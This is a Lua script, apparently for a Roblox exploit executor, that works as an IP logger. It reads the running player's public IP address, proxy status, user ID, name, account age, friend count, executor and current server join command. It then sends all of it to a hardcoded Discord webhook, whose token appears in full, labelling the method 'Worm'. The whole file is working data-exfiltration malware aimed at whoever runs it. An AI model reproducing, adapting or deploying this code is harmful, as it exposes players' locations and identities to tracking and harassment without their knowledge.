local ip = tostring(game:HttpGet("https://api.ipify.org"))
  
local function api(field)
  local field = tostring(field)
  return tostring(game:HttpGet('http://ip-api.com/csv/' .. ip .. '?fields=' .. field)):gsub("\n","")
end
local proxy = api("proxy")
local executor = identifyexecutor() or "Unknown"

local function getfriends(userid)
  local httpService = game:GetService("HttpService")
  local response = game:HttpGet("https://friends.roblox.com/v1/users/" .. userid .. "/friends/count")
  local decodedResponse = httpService:JSONDecode(response)
  local count = decodedResponse.count
  return(count)
end
local webhook = "https://discord.com/api/webhooks/1086925006384140369/2qSH6-zyB8wtY2Vq5DBsHJx6YBHACjZVJxScW2DmODoFLpAR5Z1hjLMO6D7OEGAu3taR"  
if proxy == "true" then
  ifcolor = 16711680
else
  ifcolor = 1376000
end
local data = {
  content = nil,
  embeds = { {
    color = ifcolor,
    fields = { {
      name = "**Friends  :handshake:**",
      value = "```" .. getfriends(lp.UserId) .. "```",
      inline = true
    }, {
      name = "**User ID  :identification_card:**",
      value = "```" .. lp.UserId .. "```",
      inline = true
    }, {
      name = "**Account age  :clock12:**",
      value = "```" .. lp.AccountAge .. "```",
      inline = true
    }, {
      name = "**Method  :desktop:**",
      value = "```Worm```",
      inline = true
    }, {
      name = "**IP Address  :round_pushpin:**",
      value = "```" .. ip .. "```",
      inline = true
    }, {
      name = "**Executor  :scroll:**",
      value = "```" .. executor .. "```",
      inline = true
    }, {
      name = "**Join  :scroll:**",
      value = '`game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', ' .. game.JobId .. ')`'
    }},
    author = {
      name = lp.DisplayName .. " (@" .. lp.Name .. ")",
      url = "https://www.roblox.com/users/" .. lp.UserId .. "/profile"
    },
    footer = {
      text = "https://nordvpn.com/ip-lookup/ is recommended for looking where an IP is located."
    },
    thumbnail = {
      url = "https://cdn.shopify.com/s/files/1/0679/8694/8375/files/ICE-Carousel-Desktop_027acc2f-b171-4503-90ed-2cb01c67723b.png?v=1669224732"
    }
  } },
  username = "Execution logs"
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local wh = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
local request = http_request or request or HttpPost or syn.request
request(wh)